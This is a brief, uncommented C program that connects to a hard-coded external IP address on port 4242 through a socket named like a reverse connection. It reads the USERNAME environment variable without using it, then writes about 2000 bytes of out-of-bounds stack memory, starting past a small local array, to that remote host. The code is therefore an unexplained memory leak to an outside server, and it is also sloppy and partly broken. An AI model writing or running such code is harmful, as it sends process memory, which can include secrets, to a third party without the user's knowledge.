#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){ 
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("167.172.105.55");
    
    const char * name = "USERNAME";
    char * res;
    res = getenv(name);

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    char a[] = "AAAAAAAAAAAAA";
    char b[] = "BBBBBBBBBBBBB";

    write(sockt,&a+0x10,2000);
    close(sockt);
    return 0;       
}